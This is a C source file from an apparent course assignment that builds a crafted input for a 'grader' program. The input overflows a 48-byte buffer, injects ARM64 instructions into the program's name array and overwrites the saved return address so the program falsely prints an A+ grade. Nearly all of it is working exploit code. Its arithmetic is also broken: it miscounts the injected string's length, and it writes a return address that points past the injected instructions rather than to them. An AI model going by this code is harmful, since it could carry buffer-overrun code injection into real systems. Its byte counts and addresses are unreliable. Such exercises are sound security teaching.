/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish KKat                                                 */
/*--------------------------------------------------------------------*/
/* Produces a file called dataAplus that will cause the grader program */
/* to print "A+ is your grade." despite it normally never assigning an */
/* A+ grade. The underlying principle is to exploit a buffer overrun   */
/* vulnerability to overwrite the return address on the stack with an  */
/* address in the BSS section (the 'name' array). We will place        */
/* carefully chosen instructions and strings in the 'name' array, and  */
/* after the program returns from getName, it will jump into our       */
/* injected instructions. Those instructions will:                     */
/* 1. Load the address of a string ("A+ is your grade.%c") into x0.    */
/* 2. Move a character (e.g. '\n') into w1.                            */
/* 3. Branch to the printf call site, causing "A+ is your grade." to   */
/*    be printed.                                                      */
/*                                                                    */
/* Thus, when the grader program runs with our crafted input, it will  */
/* output "A+ is your grade." and then the normal thank-you line.      */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "miniassembler.h"

/*--------------------------------------------------------------------*/
/* Interactive behavior of the main function:                         */
/* - The main function does not accept command-line arguments.         */
/* - It does not read from stdin.                                      */
/* - It writes binary data to a file named "dataAplus".                */
/* - It does not write to stdout or stderr.                            */
/* - It returns 0 upon successful completion.                          */
/*--------------------------------------------------------------------*/

int main(void) {
    /* Constants and addresses based on analysis */
    enum {
        MAX_BUFFER_SIZE = 48,                  /* Size of the buffer in readString */
        GRADE_ADDRESS = 0x420044,              /* Address where 'grade' is stored */
        PRINT_GRADE_INSTR_ADDR = 0x400874,     /* Address that calls "printf(%c is your grade...)" */
        NAME_START_ADDRESS = 0x420058          /* Start address of the name array in bss */
    };

    /* Variables for tracking how many bytes we have written and current addresses */
    int iBytesWritten = 0;
    unsigned long ulStringAddress = NAME_START_ADDRESS;
    unsigned long ulCurrentAddress = NAME_START_ADDRESS;

    /* Open the output file */
    FILE *fp = fopen("dataAplus", "w");
    if (fp == NULL) return 1;

    /*----------------------------------------------------------------*/
    /* Local comments describing written bytes:                       */
    /* We first write the attacker's name: "AnishKKata"               */
    /* Then a null terminator.                                        */
    /* Then the payload string: "A+ is your grade.%c" plus a null.     */
    /* After writing these strings, we align to a 4-byte boundary.     */
    /* Next, we insert instructions (adr, mov, b) to prepare x0, w1,   */
    /* and branch to the printf call site.                             */
    /* Finally, we pad until we reach 48 bytes, and then overwrite     */
    /* the return address with the start address of our instructions.  */
    /*----------------------------------------------------------------*/

    /* Write the student's name */
    fputs("AnishKKata", fp); 
    iBytesWritten += (int)strlen("AnishKKata");

    /* Write a null terminator after the name */
    fputc('\0', fp);
    iBytesWritten++;

    /* Update string address after writing the name and null */
    ulStringAddress += iBytesWritten;

    /* Write the "A+ is your grade.%c" message followed by null */
    fputs("A+ is your grade.%c", fp);
    fputc('\0', fp);
    iBytesWritten += 20 + 1; /* 20 chars + 1 null = 21 bytes */
    ulCurrentAddress += iBytesWritten;

    /* Align the current address to a multiple of 4 for instructions */
    while (ulCurrentAddress % 4 != 0) {
        fputc(0, fp);
        iBytesWritten++;
        ulCurrentAddress++;
    }

    /* Now insert instructions:
       We need to compute their addresses carefully.
       After writing "AnishKKata\0" (10 bytes) and "A+ is your grade.%c\0" (21 bytes),
       total is 31 bytes written before alignment padding.

       NAME_START_ADDRESS=0x420058
       After 31 bytes: 0x420058 + 31 = 0x420058 + 0x1F = 0x420077
       We wrote one null byte to align, bringing us to 0x420078 as start of instructions.

       The "A+ is your grade.%c" string starts at NAME_START_ADDRESS + 10 = 0x420058 + 10 = 0x420062.
       We'll load that address into x0.

       Instructions start at 0x420078.
    */
    unsigned long ulInstructionsStart = 0x420078;
    unsigned long ulMessageStart = 0x420062;
    unsigned int uiInstruction;

    /* adr x0, ulMessageStart */
    uiInstruction = MiniAssembler_adr(0, ulMessageStart, ulInstructionsStart);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, fp);
    iBytesWritten += 4;
    ulInstructionsStart += 4;

    /* mov w1, '\n' */
    uiInstruction = MiniAssembler_mov(1, '\n');
    fwrite(&uiInstruction, sizeof(unsigned int), 1, fp);
    iBytesWritten += 4;
    ulInstructionsStart += 4;

    /* b PRINT_GRADE_INSTR_ADDR */
    uiInstruction = MiniAssembler_b(PRINT_GRADE_INSTR_ADDR, ulInstructionsStart);
    fwrite(&uiInstruction, sizeof(unsigned int), 1, fp);
    iBytesWritten += 4;
    ulInstructionsStart += 4;

    /* Pad the rest of the buffer up to 48 bytes */
    while (iBytesWritten < MAX_BUFFER_SIZE) {
        fputc(0, fp);
        iBytesWritten++;
    }

    /* Overwrite the stored return address (getName's X30) with our instruction start */
    fwrite(&ulInstructionsStart, sizeof(unsigned long), 1, fp);

    /* Write EOF to finalize */
    fputc(EOF, fp);
   